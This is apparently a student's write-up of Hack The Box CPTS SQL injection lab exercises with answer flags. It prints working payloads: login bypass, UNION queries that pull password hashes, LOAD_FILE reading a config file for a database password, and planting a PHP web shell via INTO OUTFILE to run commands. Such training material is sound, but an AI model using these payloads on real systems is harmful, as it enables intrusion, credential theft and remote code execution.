---
title: CPTS labs - 16 SQL Injection Fundamentals
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - certification
  - CPTS
  - labs
---
# CPTS labs - 16 SQL Injection Fundamentals


## [SQL Injection Fundamentals](https://academy.hackthebox.com/module/details/33)

### MySQL

Authenticate to 83.136.255.194:55762 with user "root" and password "password"
**Connect to the database using the MySQL client from the command line. Use the 'show databases;' command to list databases in the DBMS. What is the name of the first database?**

```
mysql -u root -h $ip -P $port -ppassword
show databases;
```

Results: employees

**What is the department number for the 'Development' department?**

```
mysql -u root -h $ip -P $port -ppassword
show databases;
show tables;
select * from departments;
```

Results: d005

**What is the last name of the employee whose first name starts with "Bar" AND who was hired on 1990-01-01?**

```
mysql -u root -h $ip -P $port -ppassword
show databases;
show tables;
select * from employees WHERE first_name LIKE 'Bar%' AND hire_date='1990-01-01';
```

Results: Mitchem

**In the 'titles' table, what is the number of records WHERE the employee number is greater than 10000 OR their title does NOT contain 'engineer'?**

```
mysql -u root -h $ip -P $port -ppassword
SELECT * from titles WHERE (emp_no > 10000 OR title NOT LIKE 'Engineer');
```

Results: 654

### SQL Injections

**Try to log in as the user 'tom'. What is the flag value shown after you successfully log in?**

```
# Username
tom' OR '1'='1

# Password
lala
```

Results:  202a1d1a8b195d5e9a57e434cc16000c


**Login as the user with the id 5 to get the flag.**

```
# Username
' or id=5)#
# Leave password empty
```

Results:  cdad9ecdf6f14b45ff5c4de32909caec

Authenticate to `$ip:$port` with user "root" and password "password". Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.

```
mysql -u root -h $ip -P $port -ppassword

show databases;
use employees;
describe employees;
describe departments;
SELECT dept_no,dept_name,NULL,NULL,NULL,NULL from departments UNION select * FROM employees;
```

Results: 663


**Use a Union injection to get the result of 'user()'**

```
' ORDER BY 1;#
' ORDER BY 2;#
' ORDER BY 3;#
' ORDER BY 4;#
' ORDER BY 5;#

# With 5 columns it will return an error, so it has 4 columns

# Check out which ones are printed with
' UNION select 1,2,3,4;#

# The UI will give you columns 2,3,4. Inject the code there
' UNION select 1,user(),@@version,4;#

```

Results: root@localhost

### Exploitation

**What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?**

```
# This comes from the previous exercise...

# Get all the columns from the table users
cn' UNION select 1,column_name,3,4 from information_schema.columns WHERE table_name='users'-- -

# Get id, username and password from table users:
cn' UNION select 1,id,username,password from users-- -
```

| **Port Code** |     |     | **Port City** |     |     | **Port Volume**                  |     |     |
| ------------- | --- | --- | ------------- | --- | --- | -------------------------------- | --- | --- |
| 1             |     |     | admin         |     |     | 392037dbba51f692776d6cefb6dd546d |     |     |
| 2             |     |     | newuser       |     |     | 9da2c9bcdf39d8610954e0e11ea8f45f |     |     |

Results:  9da2c9bcdf39d8610954e0e11ea8f45f


**We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password.**

```bash
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
```

Results: dB_pAssw0rd_iS_flag!


**Find the flag by using a webshell.**

```
# Upload a webshell using the file upload. 
# 1. User with `FILE` privilege enabled. If our user is root:
SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -

# 2. Check that MySQL global `secure_file_priv` variable is not enabled
SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -

# Write access to the location we want to write to on the back-end server. In this case we will upload a shell
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

This can be verified by browsing to the `/shell.php` file and executing commands via the `0` parameter, with `?0=id` in our URL:

```html
https://$ip:$port/shell.php?0=id
```

Now we obtain the flag:

```html
https://$ip:$port/shell.php?0=cat%20%20/var/www/flag.txt
```

Results: d2b5b27ae688b6a0f1d21b7d3a0798cd


### Skills assessment

**Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.**

```
# Access to the site http:\\$ip:$port
# Enter as user
' OR 1=1-- -
# Enter anything as password

# The search box is vulnerable to SQL injection. It has 5 columns:
cn' UNION SELECT 1, super_priv, 3, 4, 5 FROM mysql.user WHERE user="root"-- -

# Checking out who we are:
cn' union select "",user(), "", "", ""-- - 
# It returns root

# Upload a SHELL
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell.php'-- -

# And now we can execute it:
http://94.237.58.147:55928/dashboard/shell.php?0=id

# Prints the root directory
http://94.237.58.147:55928/dashboard/shell.php?0=ls%20/

# Print the flag:
http://94.237.58.147:55928/dashboard/shell.php?0=cat%20/flag_cae1dadcd174.txt
```

Results: 528d6d9cedc2c7aab146ef226e918396
